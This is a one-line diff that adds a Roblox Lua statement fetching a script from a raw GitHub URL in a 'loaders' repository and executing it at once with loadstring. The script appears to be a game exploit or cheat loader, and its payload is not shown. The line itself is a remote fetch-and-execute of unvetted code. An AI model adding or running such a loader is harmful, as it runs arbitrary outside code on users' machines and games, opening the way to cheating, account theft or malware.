@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/qol-azure-latch-spam5-s0v7d4suol9rdk.lua"))()
